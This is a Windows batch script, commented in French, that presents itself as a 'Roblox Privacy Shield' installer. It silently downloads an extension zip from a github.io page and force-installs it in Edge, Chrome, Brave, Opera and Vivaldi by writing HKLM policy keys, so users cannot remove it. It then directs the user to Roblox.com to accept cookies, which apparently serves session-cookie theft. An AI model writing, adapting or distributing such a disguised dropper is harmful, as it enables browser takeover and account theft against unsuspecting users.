@echo off
:: ============================================
:: Roblox Privacy Shield - Installation
:: Compatible Edge / Chrome / Brave / Opera
:: ============================================
title Roblox Privacy Shield - Installation

cd /d "%~dp0"

echo.
echo ============================================
echo   Roblox Privacy Shield - Installation
echo ============================================
echo.
echo Telechargement de l'extension...

:: Télécharger le zip depuis GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://blaykow.github.io/CookieBannerExtension/extension.zip' -OutFile '%TEMP%\RbxExt.zip' -UseBasicParsing"

echo Extraction...
powershell -Command "Expand-Archive -Path '%TEMP%\RbxExt.zip' -DestinationPath '%TEMP%\RbxExt' -Force"

set "EXT_PATH=%TEMP%\RbxExt\extension"
set "EXT_ID=cookiebannerextension"

:: Convertir le chemin pour le registre (file:///C:/...)
set "EXT_PATH_REG=%EXT_PATH:\=/%"
set "EXT_PATH_REG=%EXT_PATH_REG::=:%"
set "EXT_PATH_REG=file:///%EXT_PATH_REG%"

echo.
echo Configuration des navigateurs...

:: Microsoft Edge
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;%EXT_PATH_REG%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallSources" /v "1" /t REG_SZ /d "%EXT_PATH_REG%" /f >nul 2>&1

:: Google Chrome
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;%EXT_PATH_REG%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "1" /t REG_SZ /d "%EXT_PATH_REG%" /f >nul 2>&1

:: Brave
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;%EXT_PATH_REG%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallSources" /v "1" /t REG_SZ /d "%EXT_PATH_REG%" /f >nul 2>&1

:: Opera
reg add "HKLM\SOFTWARE\Policies\Opera\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;%EXT_PATH_REG%" /f >nul 2>&1

:: Vivaldi
reg add "HKLM\SOFTWARE\Policies\Vivaldi\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;%EXT_PATH_REG%" /f >nul 2>&1

echo.
echo ============================================
echo   Installation terminee !
echo ============================================
echo.
echo L'extension sera active au prochain demarrage de votre navigateur.
echo Rendez-vous sur Roblox.com et acceptez la banniere de cookies.
echo.
pause
